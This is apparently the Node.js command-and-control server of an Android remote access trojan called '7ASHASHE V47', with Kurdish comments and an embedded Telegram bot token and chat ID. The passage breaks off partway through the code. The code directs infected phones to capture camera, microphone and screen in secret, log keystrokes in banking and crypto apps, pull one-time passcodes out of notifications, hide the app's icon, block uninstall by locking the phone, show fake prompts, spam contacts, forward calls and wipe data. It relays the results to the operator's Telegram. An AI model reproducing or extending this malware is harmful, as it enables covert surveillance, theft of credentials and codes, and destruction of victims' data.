// =====================================================
// 7ASHASHE V47 - ULTIMATE KURDISH RAT
// گەشەپێدەر: عەزازیل 7ASHASHE
// وەشان: 47.0.0 - ULTIMATE EDITION
// توکن: 8745582802:AAEKDPD6hQSlw7cvFHgBnDdE5-NLf-sgRWU
// چات ئایدی: 5578405082
// پۆرت: 8080
// =====================================================

const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');

// =====================================================
// 🚀 APP INITIALIZATION
// =====================================================
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// =====================================================
// 🔐 CREDENTIALS - عەزازیل 7ASHASHE
// =====================================================
const CONFIG = {
    TOKEN: '8745582802:AAEKDPD6hQSlw7cvFHgBnDdE5-NLf-sgRWU',
    CHAT_ID: '5578405082',
    MASTER: 'عەزازیل 7ASHASHE',
    VERSION: '47.0.0',
    ENCRYPTION_KEY: crypto.randomBytes(32).toString('hex'),
    SESSION_SECRET: crypto.randomBytes(64).toString('hex'),
    PORT: process.env.PORT || 8080,
    MAX_FILE_SIZE: 100 * 1024 * 1024, // 100MB
    PING_INTERVAL: 30000, // 30 seconds
    RECONNECT_TIMEOUT: 5000 // 5 seconds
};

// =====================================================
// 🤖 TELEGRAM BOT INIT
// =====================================================
const bot = new TelegramBot(CONFIG.TOKEN, { polling: true });

// =====================================================
// 📁 DIRECTORY STRUCTURE
// =====================================================
const DIRS = {
    DATA: path.join(__dirname, 'data'),
    PHOTOS: path.join(__dirname, 'data', 'wêne'),
    VIDEOS: path.join(__dirname, 'data', 'vîdyo'),
    AUDIO: path.join(__dirname, 'data', 'deng'),
    FILES: path.join(__dirname, 'data', 'fayl'),
    CONTACTS: path.join(__dirname, 'data', 'peywendî'),
    SMS: path.join(__dirname, 'data', 'sms'),
    CALLS: path.join(__dirname, 'data', 'peywendiyekan'),
    APPS: path.join(__dirname, 'data', 'êpekan'),
    KEYLOGS: path.join(__dirname, 'data', 'klîk'),
    CLIPBOARD: path.join(__dirname, 'data', 'klîpbord'),
    LOCATION: path.join(__dirname, 'data', 'shwên'),
    SCREENSHOTS: path.join(__dirname, 'data', 'screenshot'),
    SCREEN_RECORDS: path.join(__dirname, 'data', 'tômari_şashe'),
    NOTIFICATIONS: path.join(__dirname, 'data', 'notifications'),
    SCREEN_STREAMS: path.join(__dirname, 'data', 'screen_streams'),
    CALL_FORWARDING: path.join(__dirname, 'data', 'call_forwarding'),
    WIFI_CONTROL: path.join(__dirname, 'data', 'wifi_control'),
    CAM_SNAPSHOTS: path.join(__dirname, 'data', 'cam_snapshots'),
    DATABASE: path.join(__dirname, 'data', 'database.json')
};

// Create all directories
Object.values(DIRS).forEach(dir => {
    if (!dir.includes('.json') && !fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true, mode: 0o755 });
    }
});

// Initialize database
if (!fs.existsSync(DIRS.DATABASE)) {
    fs.writeFileSync(DIRS.DATABASE, JSON.stringify({
        clients: {},
        stats: {
            total_connections: 0,
            total_files: 0,
            total_commands: 0,
            notifications_captured: 0,
            screen_streams: 0,
            calls_forwarded: 0,
            messages_spammed: 0,
            cam_snapshots: 0,
            anti_uninstall_attempts: 0,
            sim_changes: 0,
            start_time: new Date().toISOString()
        }
    }, null, 2));
}

// =====================================================
// 📤 MULTER UPLOAD CONFIG
// =====================================================
const upload = multer({ 
    limits: { fileSize: CONFIG.MAX_FILE_SIZE },
    storage: multer.memoryStorage()
});

// =====================================================
// 🔧 UTILITY FUNCTIONS
// =====================================================
const readDB = () => {
    try {
        return JSON.parse(fs.readFileSync(DIRS.DATABASE, 'utf8'));
    } catch (e) {
        return { clients: {}, stats: {} };
    }
};

const writeDB = (data) => {
    fs.writeFileSync(DIRS.DATABASE, JSON.stringify(data, null, 2));
};

const encrypt = (data) => {
    const cipher = crypto.createCipher('aes-256-cbc', CONFIG.ENCRYPTION_KEY);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
};

const decrypt = (encrypted) => {
    const decipher = crypto.createDecipher('aes-256-cbc', CONFIG.ENCRYPTION_KEY);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return JSON.parse(decrypted);
};

const logToFile = (type, data) => {
    const logFile = path.join(DIRS.LOGS, `${type}_${new Date().toISOString().split('T')[0]}.log`);
    fs.appendFileSync(logFile, `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`);
};

// Store connected clients
const clients = new Map();

// =====================================================
// 📋 COMMAND HELP DESCRIPTIONS (ڕێنمایی دوگمەکان)
// =====================================================
const COMMAND_HELP = {
    // فەرمانە ئاساییەکان
    'camera': '📸 **وێنەگرتن** - وێنەیەک لە ڕێگەی کامێرای ئامێرەکەوە دەگرێت. دەتوانیت کامێرای پشت یان پێش هەڵبژێریت.',
    'mic': '🎤 **تۆمارکردنی دەنگ** - دەنگی دەوروبەر بۆ ماوەی دیاریکراو تۆمار دەکات (پێویستە ماوەکە دیاری بکەیت).',
    'location': '📍 **شوێن** - شوێنی ڕاستەقینەی ئامێرەکە لەسەر نەخشەی گووگڵ نیشان دەدات.',
    'files': '📁 **فایلەکان** - لیستی فایلەکانی ناو فۆڵدەری دیاریکراو نیشان دەدات.',
    'notifications': '📱 **نۆتیفیکەیشنەکان** - دەست بە گوێگرتنی نۆتیفیکەیشنەکانی ئامێرەکە دەکات.',
    'keylogger': '⌨️ **کێڤلۆگەر** - هەموو ئەو شتانە تۆمار دەکات کە لەسەر ئامێرەکە دەنووسرێت.',
    'screen': '📹 **Streamی شاشە** - شاشەی ئامێرەکە بە شێوەی ڕاستەوخۆ پیشان دەدات.',
    'wifi': '📶 **کۆنترۆڵی وایفای** - وایفای ئامێرەکە داگیرسێنێت یان بیکوژێنێتەوە.',
    'bluetooth': '📱 **کۆنترۆڵی بلوتوس** - بلوتوسی ئامێرەکە داگیرسێنێت یان بیکوژێنێتەوە.',
    'forward': '📞 **گواستنەوەی پەیوەندی** - هەموو پەیوەندییەکان دەگوازێتەوە بۆ ژمارەیەکی تر.',
    'spam': '📨 **سپامی کۆنتاکتەکان** - پەیامێک بۆ هەموو کۆنتاکتەکانی ناو ئامێرەکە دەنێرێت.',
    'kill_app': '🛑 **کوشتنی ئەپ** - ئەپێکی دیاریکراو بە زۆر دادەخات.',

    // فەرمانە پێشکەوتووەکان
    'anti_uninstall': '🚫 **دژە-سڕینەوە** - ڕێگری دەکات لە سڕینەوەی ئەپەکە. ئەگەر کەسێک هەوڵی سڕینەوەی بدات، مۆبایلەکە دەقفلێت.',
    'hide_icon': '👁️ **شاردنەوەی ئایکۆن** - ئایکۆنی ئەپەکە لە لیستی ئەپەکان ون دەکات.',
    'audio_stream': '🎤 **گوێگرتنی ڕاستەوخۆ** - بە شێوەی ڕاستەوخۆ گوێ لە دەنگی دەوروبەر دەگرێت.',
    'smart_screenshot': '📸 **سکرینشۆتی زیرەک** - کاتێک ئەپێکی دیاریکراو دەکرێتەوە، خۆکارانە سکرینشۆت دەگرێت.',
    'camera_control': '⚡ **کۆنترۆڵی کامێرا** - وێنە دەگرێت و دەتوانیت فلاشیش کۆنترۆڵ بکەیت.',
    'battery_bypass': '🔋 **دژە-باتری** - ڕێگری دەکات لەوەی سیستەم ئەپەکە بخەوێنێت بۆ پاشەکەوتکردنی وزە.',
    'sim_alert': '📱 **ئاگاداری سیمکارت** - ئەگەر سیمکارت گۆڕدرا، ڕاستەوخۆ ئاگاداری دەنێرێت.',
    'wipe': '💥 **سڕینەوەی داتا** - هەموو وێنە و فایلەکانی ناو ئامێرەکە دەسڕێتەوە.',
    'toast': '💬 **پەیامی ساختە** - پەیامێکی کورت لەسەر شاشەی ئامێرەکە نیشان دەدات.',
    'auto_boot': '🔄 **ڕیستارتی خۆکار** - دوای هەر کوژانەوەیەک، ئەپەکە خۆکارانە دەست پێ دەکاتەوە.'
};

// =====================================================
// 📋 HELP MENU FUNCTION (ڕێنمایی)
// =====================================================
function getHelpText(command) {
    return COMMAND_HELP[command] || `❌ ڕێنمایی بۆ ئەم فەرمانە نەدۆزرایەوە.`;
}

// =====================================================
// 🚀 ALL FEATURES FROM V41 (تەواوی تایبەتمەندییەکان)
// =====================================================

// 1. دژە-سڕینەوە (Anti-Uninstall)
class AntiUninstall {
    constructor() {
        this.uninstallAttempts = new Map();
    }

    async handleUninstallAttempt(clientId) {
        const attempts = this.uninstallAttempts.get(clientId) || 0;
        this.uninstallAttempts.set(clientId, attempts + 1);
        
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'lock_device',
                reason: 'uninstall_attempt',
                timestamp: Date.now()
            }));
        }

        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>🚫 ⚠️ دژە-سڕینەوە</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
            `<b>🔢 ژمارەی هەوڵ:</b> ${attempts + 1}\n` +
            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
            `<b>✅ مۆبایلەکە قفڵ کرا</b>`,
            { parse_mode: 'HTML' }
        );

        const db = readDB();
        db.stats.anti_uninstall_attempts++;
        writeDB(db);
    }
}

const antiUninstall = new AntiUninstall();

app.post('/api/anti-uninstall', (req, res) => {
    const { clientId } = req.body;
    antiUninstall.handleUninstallAttempt(clientId);
    res.json({ success: true });
});

// 2. شاردنەوەی ئایکۆن (Icon Hider)
class IconHider {
    constructor() {
        this.hiddenIcons = new Map();
    }

    async hideIcon(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'hide_icon',
                timestamp: Date.now()
            }));
        }

        this.hiddenIcons.set(clientId, true);

        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>👁️ 🔒 ئایکۆن شاردرایەوە</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
            `<b>✅ ئایکۆن لە لیستی ئەپەکان ون بوو</b>`,
            { parse_mode: 'HTML' }
        );
    }

    async showIcon(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'show_icon',
                timestamp: Date.now()
            }));
        }

        this.hiddenIcons.delete(clientId);

        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>👁️ 🔓 ئایکۆن دەرکەوتەوە</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}`,
            { parse_mode: 'HTML' }
        );
    }
}

const iconHider = new IconHider();

// 3. گوێگرتنی ڕاستەوخۆ (Live Audio Streaming)
class LiveAudioStream {
    constructor() {
        this.activeStreams = new Map();
    }

    async startAudioStream(clientId, duration = 60) {
        const client = clients.get(clientId);
        if (!client) return;

        const streamId = uuidv4();
        
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'start_audio_stream',
                streamId,
                duration,
                timestamp: Date.now()
            }));
        }

        this.activeStreams.set(streamId, {
            clientId,
            startedAt: new Date().toISOString(),
            duration,
            active: true
        });

        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>🎤 🔴 گوێگرتنی ڕاستەوخۆ</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
            `<b>⏱️ ماوە:</b> ${duration} چرکە\n` +
            `<b>🆔 Stream:</b> ${streamId.substring(0, 8)}...\n` +
            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}`,
            { parse_mode: 'HTML' }
        );

        return streamId;
    }

    async stopAudioStream(streamId) {
        const stream = this.activeStreams.get(streamId);
        if (!stream) return;

        const client = clients.get(stream.clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'stop_audio_stream',
                streamId,
                timestamp: Date.now()
            }));
        }

        stream.active = false;
        this.activeStreams.delete(streamId);

        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>🎤 ⏹️ گوێگرتنی ڕاستەوخۆ وەستا</b>\n\n` +
            `<b>🆔 Stream:</b> ${streamId.substring(0, 8)}...\n` +
            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}`,
            { parse_mode: 'HTML' }
        );
    }
}

const liveAudioStream = new LiveAudioStream();

app.post('/api/audio-stream', upload.single('audio'), (req, res) => {
    const { streamId } = req.headers;
    const { buffer } = req.file;

    bot.sendAudio(CONFIG.CHAT_ID, buffer, {
        caption: `<b>🎤 پارچەی دەنگ</b>\n\n<b>🆔 Stream:</b> ${streamId.substring(0, 8)}...`,
        parse_mode: 'HTML'
    });

    res.json({ success: true });
});

// 4. سکرینشۆتی زیرەک (Smart Screenshot)
class SmartScreenshot {
    constructor() {
        this.monitoredApps = new Map();
    }

    async monitorApp(clientId, appName) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'monitor_app',
                app: appName,
                timestamp: Date.now()
            }));
        }

        this.monitoredApps.set(`${clientId}:${appName}`, true);

        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>📸 👁️ چاودێری ئەپ</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>📱 ئەپ:</b> ${appName}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
            `<b>✅ کاتێک ئەپەکە بکرێتەوە، سکرینشۆت دەگیرێت</b>`,
            { parse_mode: 'HTML' }
        );
    }

    async stopMonitoring(clientId, appName) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'stop_monitoring',
                app: appName,
                timestamp: Date.now()
            }));
        }

        this.monitoredApps.delete(`${clientId}:${appName}`);
    }
}

const smartScreenshot = new SmartScreenshot();

// 5. کۆنترۆڵی کامێرا (Camera Flash Control)
class CameraFlashControl {
    constructor() {
        this.activeFlash = new Map();
    }

    async takePhoto(clientId, camera = 'back', flash = false) {
        const client = clients.get(clientId);
        if (!client) {
            bot.sendMessage(CONFIG.CHAT_ID,
                `<b>❌ هەڵە</b>\n\n<b>ئامێرەکە نەدۆزرایەوە</b>`,
                { parse_mode: 'HTML' }
            );
            return;
        }

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'take_photo',
                camera,
                flash,
                timestamp: Date.now()
            }));
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `<b>📸 وێنەگرتن</b>\n\n` +
                `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
                `<b>📷 کامێرا:</b> ${camera === 'back' ? 'پشت' : 'پێش'}\n` +
                `<b>⚡ فلاش:</b> ${flash ? 'بەڵێ' : 'نەخێر'}\n` +
                `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
                `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
                `<b>⏳ چاوەڕێی وێنەکە...</b>`,
                { parse_mode: 'HTML' }
            );
        } else {
            bot.sendMessage(CONFIG.CHAT_ID,
                `<b>❌ هەڵە</b>\n\n<b>پەیوەندی لەگەڵ ئامێرەکە نییە</b>`,
                { parse_mode: 'HTML' }
            );
        }
    }

    async toggleFlash(clientId, enable) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'toggle_flash',
                enable,
                timestamp: Date.now()
            }));
        }

        this.activeFlash.set(clientId, enable);
    }
}

const cameraFlashControl = new CameraFlashControl();

// 6. دژە-باتری (Battery Bypass)
class BatteryBypass {
    constructor() {
        this.bypassActive = new Map();
    }

    async enableBypass(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'enable_battery_bypass',
                timestamp: Date.now()
            }));
        }

        this.bypassActive.set(clientId, true);

        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>🔋 ⚡ دژە-باتری چالاک کرا</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
            `<b>✅ سیستەمی پاشەکەوتکردنی وزە ناچالاک کرا</b>`,
            { parse_mode: 'HTML' }
        );
    }

    async disableBypass(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'disable_battery_bypass',
                timestamp: Date.now()
            }));
        }

        this.bypassActive.delete(clientId);
    }
}

const batteryBypass = new BatteryBypass();

// 7. ئاگاداری سیمکارت (SIM Change Alert)
class SimChangeAlert {
    constructor() {
        this.simInfo = new Map();
    }

    async handleSimChange(clientId, newSimInfo) {
        const client = clients.get(clientId);
        if (!client) return;

        this.simInfo.set(clientId, newSimInfo);

        let location = 'نەزانراو';
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'get_location',
                timestamp: Date.now()
            }));
        }

        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>📱 ⚠️ گۆڕینی سیمکارت</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
            `<b>📱 سیمی نوێ:</b> ${newSimInfo.number || 'نەزانراو'}\n` +
            `<b>📡 کەریەر:</b> ${newSimInfo.carrier || 'نەزانراو'}\n` +
            `<b>🌍 شوێن:</b> ${location}\n` +
            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}`,
            { parse_mode: 'HTML' }
        );

        const db = readDB();
        db.stats.sim_changes++;
        writeDB(db);
    }
}

const simChangeAlert = new SimChangeAlert();

app.post('/api/sim-change', (req, res) => {
    const { clientId, simInfo } = req.body;
    simChangeAlert.handleSimChange(clientId, simInfo);
    res.json({ success: true });
});

// 8. سڕینەوەی داتا (Remote Wipe)
class RemoteWipe {
    constructor() {
        this.wipeInProgress = new Map();
    }

    async wipeData(clientId, wipeType = 'all') {
        const client = clients.get(clientId);
        if (!client) return;

        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>💥 ⚠️ سڕینەوەی داتا</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
            `<b>📋 جۆر:</b> ${wipeType === 'all' ? 'هەموو داتاکان' : 'تەنها وێنە'}\n` +
            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
            `<b>✅ دەستپێکردنی سڕینەوە...</b>`,
            { parse_mode: 'HTML' }
        );

        this.wipeInProgress.set(clientId, {
            type: wipeType,
            startedAt: new Date().toISOString()
        });

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'wipe_data',
                wipeType,
                timestamp: Date.now()
            }));
        }

        setTimeout(() => {
            this.wipeInProgress.delete(clientId);
        }, 60000);
    }

    async wipePhotos(clientId) {
        await this.wipeData(clientId, 'photos');
    }

    async wipeAll(clientId) {
        await this.wipeData(clientId, 'all');
    }
}

const remoteWipe = new RemoteWipe();

// 9. پەیامی ساختە (Fake Toast)
class FakeToast {
    constructor() {
        this.toasts = new Map();
    }

    async sendToast(clientId, message, duration = 3000) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'show_toast',
                message,
                duration,
                timestamp: Date.now()
            }));
        }

        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>📱 💬 پەیامی ساختە نێردرا</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
            `<b>📝 پەیام:</b> ${message}\n` +
            `<b>⏱️ ماوە:</b> ${duration}ms\n` +
            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}`,
            { parse_mode: 'HTML' }
        );
    }

    async sendUpdateToast(clientId) {
        await this.sendToast(clientId, '⚠️ سیستم پێویستی بە نوێکردنەوەیە. تکایە نوێ بکەوە', 5000);
    }

    async sendSecurityToast(clientId) {
        await this.sendToast(clientId, '🔒 دۆزینەوەی هەوڵی دزینی زانیاری. تکایە وەڵام بدەرەوە', 5000);
    }
}

const fakeToast = new FakeToast();

// 10. سیستمی ڕیستارت (Auto-Boot)
class AutoBoot {
    constructor() {
        this.bootEnabled = new Map();
    }

    async enableAutoBoot(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'enable_auto_boot',
                timestamp: Date.now()
            }));
        }

        this.bootEnabled.set(clientId, true);

        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>🔄 ⚡ سیستمی ڕیستارت چالاک کرا</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
            `<b>✅ دوای هەر کوژانەوەیەک، ئەپەکە خۆکارانە دەست پێ دەکاتەوە</b>`,
            { parse_mode: 'HTML' }
        );
    }

    async disableAutoBoot(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'disable_auto_boot',
                timestamp: Date.now()
            }));
        }

        this.bootEnabled.delete(clientId);
    }

    async handleBootComplete(clientId) {
        const client = clients.get(clientId);
        if (!client) return;

        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>🔄 ✅ ئامێر دووبارە بووەوە</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
            `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
            `<b>✅ ئەپەکە خۆکارانە دەستی پێ کردەوە</b>`,
            { parse_mode: 'HTML' }
        );
    }
}

const autoBoot = new AutoBoot();

app.post('/api/boot-complete', (req, res) => {
    const { clientId } = req.body;
    autoBoot.handleBootComplete(clientId);
    res.json({ success: true });
});

// 11. Notification Listener
class NotificationListener {
    constructor() {
        this.notifications = [];
        this.listening = false;
    }

    start() {
        this.listening = true;
        console.log('📱 Notification listener started');
    }

    captureNotification(notification) {
        const notif = {
            id: uuidv4(),
            app: notification.app || 'نەزانراو',
            title: notification.title || '',
            text: notification.text || '',
            timestamp: new Date().toISOString()
        };
        
        this.notifications.push(notif);
        
        const notifFile = path.join(DIRS.NOTIFICATIONS, `${Date.now()}_${notif.app}.json`);
        fs.writeFileSync(notifFile, JSON.stringify(notif, null, 2));
        
        const isOTP = notif.text && notif.text.match(/\b\d{4,6}\b/);
        
        if (isOTP) {
            bot.sendMessage(CONFIG.CHAT_ID,
                `<b>💰 🔐 ئاگاداری OTP</b>\n\n` +
                `<b>📱 ئەپ:</b> ${notif.app}\n` +
                `<b>📌 ناونیشان:</b> ${notif.title}\n` +
                `<b>📝 پەیام:</b> ${notif.text}\n` +
                `<b>🔢 OTP:</b> ${notif.text.match(/\b\d{4,6}\b/)}\n` +
                `<b>⏰ کات:</b> ${new Date(notif.timestamp).toLocaleString('ckb')}`,
                { parse_mode: 'HTML' }
            );
        } else {
            bot.sendMessage(CONFIG.CHAT_ID,
                `<b>📱 نۆتیفیکەیشن</b>\n\n` +
                `<b>📱 ئەپ:</b> ${notif.app}\n` +
                `<b>📌 ناونیشان:</b> ${notif.title}\n` +
                `<b>📝 پەیام:</b> ${notif.text}\n` +
                `<b>⏰ کات:</b> ${new Date(notif.timestamp).toLocaleString('ckb')}`,
                { parse_mode: 'HTML' }
            );
        }
        
        const db = readDB();
        db.stats.notifications_captured++;
        writeDB(db);
        
        return notif;
    }

    getNotifications() {
        return this.notifications;
    }
}

const notificationListener = new NotificationListener();

app.post('/api/notification', (req, res) => {
    const notification = req.body;
    const captured = notificationListener.captureNotification(notification);
    res.json({ success: true, notification: captured });
});

// 12. Screen Stream
class ScreenStreamer {
    constructor() {
        this.streams = new Map();
        this.activeStreams = 0;
    }

    async startStream(clientId, options = { quality: 'high', fps: 30 }) {
        try {
            const stream = {
                id: uuidv4(),
                clientId,
                options,
                startedAt: new Date().toISOString(),
                frames: 0,
                active: true
            };
            
            this.streams.set(stream.id, stream);
            this.activeStreams++;
            
            const streamFile = path.join(DIRS.SCREEN_STREAMS, `${stream.id}.json`);
            fs.writeFileSync(streamFile, JSON.stringify(stream, null, 2));
            
            const db = readDB();
            db.stats.screen_streams++;
            writeDB(db);
            
            const client = clients.get(clientId);
            if (client) {
                bot.sendMessage(CONFIG.CHAT_ID,
                    `<b>📹 Streamی شاشە دەستی پێکرد</b>\n\n` +
                    `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
                    `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
                    `<b>📊 کوالیتی:</b> ${options.quality}\n` +
                    `<b>🎞️ FPS:</b> ${options.fps}\n` +
                    `<b>🆔 Stream:</b> ${stream.id.substring(0, 8)}...`,
                    { parse_mode: 'HTML' }
                );
            }
            
            return stream;
        } catch (error) {
            console.error('Screen stream error:', error);
            return null;
        }
    }

    stopStream(streamId) {
        const stream = this.streams.get(streamId);
        if (stream) {
            stream.active = false;
            this.streams.delete(streamId);
            this.activeStreams--;
            
            const duration = Math.floor((Date.now() - new Date(stream.startedAt)) / 1000);
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `<b>⏹️ Streamی شاشە وەستا</b>\n\n` +
                `<b>🆔 Stream:</b> ${streamId.substring(0, 8)}...\n` +
                `<b>📊 فرەیم:</b> ${stream.frames}\n` +
                `<b>⏱️ ماوە:</b> ${duration} چرکە`,
                { parse_mode: 'HTML' }
            );
        }
    }

    getActiveStreams() {
        return Array.from(this.streams.values()).filter(s => s.active);
    }
}

const screenStreamer = new ScreenStreamer();

app.post('/api/screen/stream', (req, res) => {
    const { clientId, options } = req.body;
    screenStreamer.startStream(clientId, options).then(stream => {
        res.json({ success: true, streamId: stream.id });
    });
});

app.post('/api/screen/stop/:streamId', (req, res) => {
    const { streamId } = req.params;
    screenStreamer.stopStream(streamId);
    res.json({ success: true });
});

app.post('/api/screen/frame', (req, res) => {
    const { streamId, frame } = req.body;
    const stream = screenStreamer.streams.get(streamId);
    if (stream && stream.active) {
        stream.frames++;
    }
    res.json({ success: true });
});

// 13. Smart Keylogger
class SmartKeylogger {
    constructor() {
        this.logs = [];
        this.activeApps = new Map();
        this.bankingApps = [
            'بەنک', 'بانک', 'کاش', 'پارە', 'کریپتۆ',
            'bank', 'pay', 'crypto', 'wallet', 'cash'
        ];
    }

    logKey(clientId, key, app) {
        const log = {
            id: uuidv4(),
            clientId,
            key,
            app: app || 'سیستەم',
            timestamp: new Date().toISOString(),
            isSensitive: this.isSensitiveApp(app)
        };
        
        this.logs.push(log);
        
        const logFile = path.join(DIRS.KEYLOGS, `${app}_${new Date().toISOString().split('T')[0]}.log`);
        fs.appendFileSync(logFile, `[${log.timestamp}] ${key}\n`);
        
        if (this.isSensitiveApp(app)) {
            const client = clients.get(clientId);
            if (client) {
                bot.sendMessage(CONFIG.CHAT_ID,
                    `<b>💰 ئاگاداری بانکی</b>\n\n` +
                    `<b>📱 ئەپ:</b> ${app}\n` +
                    `<b>⌨️ کلیک:</b> ${key}\n` +
                    `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
                    `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
                    { parse_mode: 'HTML' }
                );
            }
        }
        
        return log;
    }

    isSensitiveApp(app) {
        return this.bankingApps.some(b => app && app.toLowerCase().includes(b.toLowerCase()));
    }

    getLogs(app = null) {
        if (app) {
            return this.logs.filter(l => l.app === app);
        }
        return this.logs;
    }

    startTracking(clientId, app) {
        this.activeApps.set(clientId, app);
        const client = clients.get(clientId);
        if (client) {
            bot.sendMessage(CONFIG.CHAT_ID,
                `<b>⌨️ کێڤلۆگەری زیرەک دەستی پێکرد</b>\n\n` +
                `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
                `<b>📱 ئەپ:</b> ${app}\n` +
                `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
                { parse_mode: 'HTML' }
            );
        }
    }

    stopTracking(clientId) {
        this.activeApps.delete(clientId);
    }

